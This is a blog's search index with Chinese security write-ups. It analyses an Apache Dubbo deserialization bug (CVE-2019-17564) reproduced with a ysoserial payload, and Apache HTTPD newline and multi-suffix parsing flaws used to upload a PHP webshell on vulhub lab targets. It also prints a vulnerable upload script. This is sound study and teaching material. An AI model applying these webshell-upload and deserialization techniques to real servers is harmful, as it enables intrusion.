<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021年的总结</title>
    <url>/2021/11/15/2021%E5%B9%B4%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="efacb27086f9fb7872b9027510e3afb3c93c43d1408e22998919b63ad391fbff">05c681a07e0f39bb24b350122b910aef56361e6cd1e45a4e392261b953ea978551728d167bf7678305bc5a122f31f8b3cfb7b07ee552d9a46822824f756d7f92741f478e320521a9d11ce2f2772191d146f7057084f8660277faa2092130e2cedc2b983dfb29fdbe742cd39509c88965be08039883cfe9936654ecf24dcb5fcc394fd9cbf6f8134bb85013ceb583a234333fe36a2fb62bf1ac8af0d5fcd7974871eaac7fb096f001056f49e7ae6cf07031f18b3c5eed90d4d59ecfa38cdb0999d1eb3f784cdd61cfa19a6e533d24e3c9749a47be77c28c11976a00f058cfb9bb8559bb4b2d24f87a814e35c0e318c9d85d24ad4e2820245de5151b778faac697e1aad03ab8cf823211057d54fd7464a0a63765a9bce3dfc3f74ceaf965e69cd9835876820d5d69cbf46d5d894090e6f8b9c27241dbb2769e223040b04f1a17a3a4f5896e19604d6eb2c56d382f2942e83448584b0c3df309decd8bc0f09f1c0c0066393bfb077b90457a66bf087cc6574981c2a61dad72b793bcc3993a7d6a7f72fb0c399a49a3e2d2ae35cf1699aa3cc6e5b5cded97f3a5679cc60487c605f0a05c46a22834f9f19152f057206057d96bb23100c0729cf4b3f5f15d9ff8475eeb5d1e33623b4405182b5fd669f6a93ecf429cf69e781855adae31be0499f31baa6171fa5b0b55ed910971f472e61470eae1fb59201853d3ef005fda27243e7cf39a01c559d613a7edbc8345708defe4dfd951f8084c4995e9dbe877e46d9f46de72eae771f4e97e3258f758911f35e014e29c91f26c6b4825d255769e6397f5035b95e49a3f77ed025f0a236852821f25133ba6800fbd337baac494acf0ea37d587e1d9dd5151b6ec39737366fa2451c4e47cb2dc0780a5921f0b8830c45fd5c3039d5d27cfb4c83ade59aa4f1175a831d4b12746b7bdcab40f889df54e6e93e11e4df7bd15e43aee363a115464ff30a745ca810c594b9088d10bf08c7816cd355b7503878a0e10b5462c72e702f31a3b15b8a70ba19b43ba0c465a51a7c7760db418492db2ca75fd2d3e5ea847f620360b8c6267cda8f5129912889c30873c21f2ec9038cae3631167c9bcada0899c536d24e99ddbd1b64370e14de88e92be02d0e6b9581d7a7429142dffbe41420d2fbcb81c31e8c1e717eee3f638fc1d52d16d44d2e4fd28a993cfb66d23a2025d9076603d0e5607b812474af12665d0676f988f42273d670e380c5fac435520a1d67977257287b92dc07223cddd7ad3ba55b79776434a81bc1e900fe05e2c3c57396045c69830aeb5fc98d5db39564981209f835aa366e93f6f4d871fd4ca19deefac2bc1ab39d731648bc05b155db4d5c9fecfbd0535d87df5cb38762eaa47bdf9f76164fc962f2baa04333910fcc86eb3237bff5ac802419e7b4aa3e64792d99ae35af5892d4860fe733297c3e51b33ffa30a663281b0cd5224c2b27aa936e0813e8139f3076407b146e4a4d106fe8157319c99e19c830b44d7169261bd13b3678773bb4f9012ea8af50678c11796159fa05f83e20f60f1af99577445c63eae18dcee39745ce6963c41362712bfb6173fd6b14271c1bd83f8ddd7e567a1164bee645d553c5dfcf18831e61cf90ad353e987c3b3a031a091acf0d84235c161797f191afe6fd695066820853aba457cefba72a7f97a7a894b6cd232b7376321755250d65f2304e60cffa77c779ad1d5de45f4d7b2b67ece8f20a333dc5c45418d3ed613585523aad355214e0d8e5717f6a0694e2d30314104500827fdeaf812556248ee1f28d7fcd1ff63024c5ca491b1a2119b856de19ddfa0c943505ecb8bff47e38d85e287699698148a14e8b5a0ad5aa773df069bf164ff7205dd78bfc3900ddadcebfa6e0b40a7ece8953f1891c4c5fadeb49a9711d6bf4c58cb96568e5503c1c29a7db5e5951d1bf3dc2d15aa0953b24b34a56136aded857577dd1c800dbcbb98cb110329d555d3760098aa446e5399a788902c76adb4f18d3db62f0c91bcec430256e8011e1f831066c6850dd31b4f6c5b1aca386c8f51031da697320724e68bc0d60010cd553f2542e77f63807f766d71dceef17fb470868fc70900e47e6ab0825307458612dddf7c9efb3dcc3a685b8f184fefb033a25ec7f3450f53a7d28582f4476d51759b676ddbb3a863d6bdc269d67452e5715c7a04723915e99cfd9365f42558be4ddc6694a25036d0238d621d7deb3ca0dbe49b4d495abfb75818c70feed8b6abd23bcc04bcb696fae5dcec6eacb3450cf1c9167dea72db60ed17ff6fd1fe5e5d2dce6057fb5f20f25c1ef139ef83640a0266040424ca33c2993fd9b5a4e483a233260f27222e129a3615d7bb1f88453a1cc0c6b42f62dff299be2b57fc9bbba79536381147398319a7de89c7ed14eb317bf5eab3fbabdeaef6d16da5260259eec6a93d7662658f5d6689238a8df600b6bf95cbdaacb8c3154eb391742f6a7d8665af78f79af91b59e4d84ba444638249e28b5403d80cc955f76ebe9606960c68968450f4c7e69bf722593b4b5cffc04ed973a10d0d9ab24fd2fb82c1ece9de23b6b367035bbd1d8a2110959afcba09e8ed8229670bdb7c9a3056c92733e8f53db34327536970f926264e18c8488f93ef7ce000b3f2cfac9989770a07c40dbaee8e60dd26c28605e4bc962b3c2c095f6c669290e4e0a080c94cf20c305bc1c216336b4ca7b6d33fc9d24e66bb2b313eb1dddfd14be7fd3b2129521ef9b356d238466f4f9740e05ec193a8d369696baa608cc1cc2e11c0b6d30f9e4abf6ab4f9edfbd8a29a65aa2345bbe5204145601f02a096607ddd51063dc534d00dd1ff0186e1d682f6fe1b5747e78c9786fe03a0e705a8babe6760e45f16dcd3558c2c23169dff0fb531689dd7185aa957296fcfa2b0bed71b61e7df40bf1862aec3b6776363833c186b82c5d0782a9fa8d0f34da9bc1203a223ceb6ba4e9ed12638ea3c0290b84f8e7df81f1c2714559f669a16976609c99cadfc815f59d88711d8d79c3cb5831444afed68c4bb54337cfb95e47966646d4a855a6c7973be31d7005921f89ad9b9fc446f7ea802d142b3c9bae6ca036bb0f5bb729a6782084f3e91a80a766623cc62f20264ec3d4b1ea89d9db9d3db1f142f861672eee8b87152bac528e1a9b619dc9a209aff2613b0f1c96f33d8d714b107fde85fbe6753aa1d3722363696042a401a5398e5e8e3b9bf44812736c56c215b668c816fcaaea9daa1f7d14e4be25a7ed9a50daebe4a0d3e9036f486faed67e5b89376611fc9cc5a1bc75d9fde5da16090355921bec55a5f58878a003357b4cf183b616e4ca6785c2b77e74df8219e6875552478a4aa9a150ebab1ccf7e3901e69b912c3e3109b69c94fecd5e62acddc56cd92611eff329b927bf681c7e9db4c13643b990ca04ca1250e596950e40b35363351281f7d786a31d2adc1a0570598a80ff1d9afda79ce37d69c5141344768fdffc59af77318c366911aab9ef8dd69db84f495935c510bfbfa941312bca571b94e79feda8435d05d8e4cc9aee95197d6377732a9b8532950c60b919f6c0eab1bdac6b4336f1cc6deaedd7e42648aad3edbb1935a6f859a358c227079cec0afc8a66b2f880959f08211a767eb8b033ce7d60a94dd5eec65627b4d5aae2fbcc1a1fbbd8abf6b37a9bf941741de71111704c658d3a1f019228bbec8f7c1c1ef5118c8d47dfdec854920a8a272e848a45bf30de79f5d40a7134ec9c44470b61450bcf6249ed4283eb73d6ed04caadd714d3d0249e85a53167ea138c7a9bafa58305f759daa9d4fd851317006470d8c5d8e1fa4e62c4e84145d77250fb77a5a396a2e9a19f183a012ad80fcf50e5a5fba7b3dc7aaab8d96cdf0c309fd30d15b07fd69df24cd9f41d289a25d3fa23cace7ed8a5660a1c1c26f2b42c09bfd09f6443c40fb7866e2bd4498a28edaa5e390dc3b35ca1cfc333cfd8d8a358866b216226f2a77495cfc827cd86d4cc0b9a720d849ded1ccbe993f76663f87aa4d05134b4162c03a4502902b4f89d730e7f9256fcb1a73584a7eda6bca4515ea668844f4a746fbeccf260135b30dde0faaded50927493161afec4760072f6c9b630f629f890fe8752568ff679409a50c91047b86664c73732086cf5063587de261b21d6d8d3e67a92c4165f69b786d152d0222e6ed646d8726ff7210a6661b116080552ef8835e5234fcbebe0f9facd7162d12064c941aeae6be16882b9013e8b5a95042bfc333e368d66b0b21bd4a840df9ac38c6e8f3876ae89ea6ddc1c89ebfed8f63172abbb301bf08f73585e930cc392c0d5c65b3002e</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Dubbo系列漏洞分析</title>
    <url>/2022/01/23/Apache-Dubbo%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此篇文章将分析apache dubbo系列漏洞，在复现的时候花了些时间，因为国内好多文章都是照搬，这里将自己的复现过程全部写出来，也是为以后避坑。</p>
<h1 id="什么是RPC"><a href="#什么是RPC" class="headerlink" title="什么是RPC"></a>什么是RPC</h1><p>RPC全称为Remote Procedure Calls，翻译为远程过程调用，常用于分布式。</p>
<p>关于RPC和RMI的区别：</p>
<blockquote>
<p>*<strong>Remote Procedure Call (RPC)*</strong> is a inter process communication which allows calling a function in another process residing in local or remote machine.</p>
<p>*<strong>Remote method invocation (RMI)*</strong> is an API, which implements RPC in java with support of object oriented paradigms.</p>
<ol>
<li>You can think of invoking RPC is like calling a C procedure. RPC supports primitive data types where as RMI support method parameters/return types as java objects.</li>
<li>RMI is easy to program unlike RPC. You can think your business logic in terms of objects instead of a sequence of primitive data types.</li>
<li>RPC is language neutral unlike RMI, which is limited to java</li>
<li>RMI is little bit slower to RPC</li>
</ol>
</blockquote>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/08212f29-d32a-4b01-8ca9-a3b1945f11de.png" alt="img"></p>
<h1 id="Apache-Dubbo-Introduction"><a href="#Apache-Dubbo-Introduction" class="headerlink" title="Apache Dubbo Introduction"></a>Apache Dubbo Introduction</h1><p>Apache Dubbo是开源的Alibaba RPC和微服务框架，其包含以下组成：</p>
<ul>
<li>Provider</li>
<li>Container</li>
<li>Consumer</li>
<li>Registry - 分布式中的注册中心，返回list of <strong>providers</strong> to a <strong>consumer</strong></li>
<li>Monitor</li>
</ul>
<h1 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE 2019-17564"></a>CVE 2019-17564</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</li>
<li>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</li>
<li>Apache Dubbo = 2.5.x</li>
<li>Zookeeper</li>
</ul>
<ol>
<li>下载好Apache Dubbo后用intellij打开http module</li>
</ol>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209142533883.png" alt="image-20220209142533883"></p>
<p><strong>http-provider.xml</strong>中修改端口号，zookeeper会占用8080端口</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209143024881.png" alt="image-20220209143024881"></p>
<p><strong>pom.xml</strong>中修改dubbo version为2.7.3</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209143323692.png" alt="image-20220209143323692"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209143334541.png" alt="image-20220209143334541"></p>
<p>在dependencies中也需要添加version，否则会失效(这里卡了很久)。</p>
<h3 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h3><p>下载好zookeeper，在conf中新建一个zoo.cfg，并将zoo_sample.cfg的内容复制到zoo.cfg中，可以自行修改配置</p>
<p>然后运行<code>bin\zkServer.cmd</code></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>运行HttpConsumer之后，发现实际上访问了<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163525769.png" alt="image-20220209163525769"></p>
<p>我们使用postman来验证一下：</p>
<p>用debug模式运行httpProvider，再使用postman发送get请求</p>
<p><code>http://127.0.0.1:8081/org.apache.dubbo.samples.http.api.DemoService</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163631458.png" alt="image-20220209163631458"></p>
<p>发现请求发出后，会被断在DispatcherServlet#service处</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163709134.png" alt="image-20220209163709134"></p>
<p>根据servlet相关知识我们知道，请求会被分类封装(如get请求、post请求)，然后被发给指定的servlet</p>
<p>我们继续跟进handle方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163850376.png" alt="image-20220209163850376"></p>
<p>可以发现会检测到request的请求方法，如果是get，则返回500错误。因此我们需要尝试将其改为post</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163937359.png" alt="image-20220209163937359"></p>
<p>请求发送后再次断在刚才的地方</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209164014482.png" alt="image-20220209164014482"></p>
<p>继续跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//在此处F7跟进，看他是如何read Remote Invocation的</span></span><br><span class="line">        <span class="type">RemoteInvocation</span> <span class="variable">invocation</span> <span class="operator">=</span> <span class="built_in">this</span>.readRemoteInvocation(request);</span><br><span class="line">        <span class="type">RemoteInvocationResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeAndCreateResult(invocation, <span class="built_in">this</span>.getProxy());</span><br><span class="line">        <span class="built_in">this</span>.writeRemoteInvocationResult(request, response, result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Class not found during deserialization&quot;</span>, var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.readRemoteInvocation(request, request.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">//此处会获取输入流，往下跟后发现抛出了异常</span></span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.createObjectInputStream(<span class="built_in">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">    RemoteInvocation var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//此处read Remote Invocation</span></span><br><span class="line">        var4 = <span class="built_in">this</span>.doReadRemoteInvocation(ois);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209164418884.png" alt="image-20220209164418884"></p>
<p>下面的<code>this.doReadRemoteInvocation(ois);</code>并未被执行，为什么呢？</p>
<p>因为我们并未在post请求体中放入数据，无法获取到输入流</p>
<p>看看doReadRemoteInvocation方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209165553503.png" alt="image-20220209165553503"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">//反序列化触发</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Deserialized object needs to be assignable to type [&quot;</span> + RemoteInvocation.class.getName() + <span class="string">&quot;]: &quot;</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (RemoteInvocation)obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在pom.xml中添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重新运行HttpProvider</p>
<p>使用ysoserial生成cc4 payload</p>
<p>使用postman：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209165848037.png" alt="image-20220209165848037"></p>
<p>发送请求后成功弹出计算器：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209165906408.png" alt="image-20220209165906408"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://stackoverflow.com/questions/2728495/what-is-the-difference-between-java-rmi-and-rpc">https://stackoverflow.com/questions/2728495/what-is-the-difference-between-java-rmi-and-rpc</a></p>
<p><a href="https://itzone.com.vn/en/article/an-introduction-to-apache-dubbo-and-cve-2019-17564-analysis/">https://itzone.com.vn/en/article/an-introduction-to-apache-dubbo-and-cve-2019-17564-analysis/</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache HTTPD 漏洞复现系列</title>
    <url>/2021/09/04/Apache-HTTPD%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本章总结了一系列的Apache相关的漏洞，从漏洞形成到漏洞触发到漏洞总结。</p>
<h1 id="什么是Apache"><a href="#什么是Apache" class="headerlink" title="什么是Apache"></a>什么是Apache</h1><p>Apache HTTP Server是一种Web服务器，负责回应收到的web请求。</p>
<p>例如，Apache收到<code>/index.php</code>的请求时，通过CGI调用PHP解释程序，执行<code>/index.php</code>，返回结果给客户端</p>
<blockquote>
<p><strong>httpd</strong>是Apache<a href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8535513">超文本传输协议</a>(HTTP)服务器的主程序。被设计为一个独立运行的后台进程，它会建立一个处理请求的子进程或线程的池。</p>
</blockquote>
<span id="more"></span>

<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>影响版本：apache2.40~2.4.29</p>
<p>复现靶机：<a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</a></p>
<p>漏洞环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="漏洞形成点一：-与FilesMatch"><a href="#漏洞形成点一：-与FilesMatch" class="headerlink" title="漏洞形成点一：$与FilesMatch"></a>漏洞形成点一：$与FilesMatch</h3><p>在该版本的apache配置中，有一段这样的代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> \<span class="attr">.php</span>$&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们使用<code>FilesMatch</code>来匹配<code>.php</code>结尾的文件，并将文件解析为php文件（<code>SetHandler application/x-httpd-php</code>）</p>
<p>此处<code>$</code>就是结尾的意思。但需要注意的是<strong>dollar</strong>符号也会匹配到换行符<code>0xa</code></p>
<p>举个例子： 如果文件名是<code>.php+换行符</code>结尾，仍然会被匹配，在这个情况下，依然会被解析为php文件。</p>
<h3 id="漏洞形成点二：文件上传点"><a href="#漏洞形成点二：文件上传点" class="headerlink" title="漏洞形成点二：文件上传点"></a>漏洞形成点二：文件上传点</h3><p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904143549934.png" alt="image-20210904143549934"></p>
<p>观察发现，在<code>index.php</code>中有一处上传点，此处会获取<code>name</code>参数，并检测name是否在黑名单内，如果不在，就会将上传的文件移动到当前目录下。</p>
<p>此处为什么不可以直接上传<code>.PHP</code>呢？如果你动手试一下，发现确实是可以上传的，而且绕过了黑名单。但问题在于，它并不会被解析。 在前面提到的配置文件中，<strong>FilesMatch</strong>只对<code>.php</code>后缀的文件进行匹配并解析，所以即使你能够上传<code>.PHP</code>，它也不会被解析为<code>php</code>文件。</p>
<p>但如果我们上传文件名是<code>.php+换行符</code>，那就可以成功绕过黑名单并解析了。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>抓包上传一个<code>php</code>木马</p>
<p>修改<code>name</code>参数（注意，POST请求中的参数名在html表格中是这样的 <code>name=&quot;这里是参数名&quot;</code>)</p>
<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904144515665.png" alt="image-20210904144515665"></p>
<p>在<code>php</code>后面加上空格，再把这个空格改成16进制的<code>0a</code>（换行符）</p>
<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904144609268.png" alt="image-20210904144609268"></p>
<p>使用菜刀访问：<code>/leihehe.php%0a</code></p>
<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904144816659.png" alt="image-20210904144816659"></p>
<p><strong>注意：在windows下可能无法实现，因为windows下无法保存含有换行符的文件名</strong></p>
<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p><code>$</code>的正则匹配并不会过滤掉换行符<code>0xa</code>，以后遇见<code>$</code>，就有更多的潜在突破口了。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.zhihu.com/question/19896544/answer/13284800">怎样通俗的讲解 PHP 和 Apache 的关系？ - yskin的回答 - 知乎 </a></p>
<p><a href="https://www.cnblogs.com/hello-py/articles/13519017.html">Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展</a></p>
<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>复现靶机：<a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a></p>
<p>漏洞环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="漏洞形成点一：AddHandler-php及Apache解析特性"><a href="#漏洞形成点一：AddHandler-php及Apache解析特性" class="headerlink" title="漏洞形成点一：AddHandler .php及Apache解析特性"></a>漏洞形成点一：AddHandler .php及Apache解析特性</h3><p>我们在配置文件下可以看到以下代码：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br><span class="line"></span><br><span class="line">DirectoryIndex disabled</span><br><span class="line">DirectoryIndex index.php index.html</span><br></pre></td></tr></table></figure>

<p>此处的<code>AddHandler</code>的意思是如果后缀为<code>.php</code>，那么我们就给他加上<code>x-httpd-php</code>处理器，也就是将此文件解析为<code>php</code>文件。</p>
<p><code>Apache</code>在处理文件时有个特性 - 从右到左解析文件。</p>
<p>比如<code>hello.php.jpg</code>，Apache会先检测到<code>.jpg</code>这个后缀，接着他会在这个上面的配置文件中寻找，发现并没有解析<code>.jpg</code>的规则，于是他便<strong>往前寻找后缀</strong>，这时发现了<code>.php</code>后缀，再在配置文件中寻找发现<code>.php</code>可以被解析为<code>php</code>文件。由此，<code>hello.php.jpg</code>不会被解析为<code>jpg</code>，反而会被解析为<code>php</code>，即使<code>php</code>后缀不是在最后。</p>
<h3 id="漏洞形成点二：文件上传点-1"><a href="#漏洞形成点二：文件上传点-1" class="headerlink" title="漏洞形成点二：文件上传点"></a>漏洞形成点二：文件上传点</h3><p><code>index.php:</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (!empty($_FILES)):</span><br><span class="line"></span><br><span class="line">$ext = pathinfo($_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);//获取后缀名</span><br><span class="line">if (!in_array($ext, [&#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpg&#x27;, &#x27;jpeg&#x27;])) &#123;</span><br><span class="line">    //如果后缀名不在白名单中，返回以下信息</span><br><span class="line">    die(&#x27;Unsupported filetype uploaded.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//如果后缀在白名单范围中，上传该文件</span><br><span class="line">$new_name = __DIR__ . &#x27;/uploadfiles/&#x27; . $_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;];</span><br><span class="line">if(!move_uploaded_file($_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;], $new_name))&#123;</span><br><span class="line">    die(&#x27;Error uploading file - check destination is writeable.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die(&#x27;File uploaded successfully: &#x27; . $new_name);</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    File: &lt;input type=&quot;file&quot; name=&quot;file_upload&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此处图片格式的文件可以被上传，那么我们可以伪造以下文件名:<code>hello.php.jpg</code></p>
<p>即可将文件成功上传，该文件会被解析为<code>.php</code>文件（<code>jpg</code>没有对应的解析规则，所以会往前寻找后缀）</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传一个文件名为<code>leihehe.php.jpg</code>的文件</p>
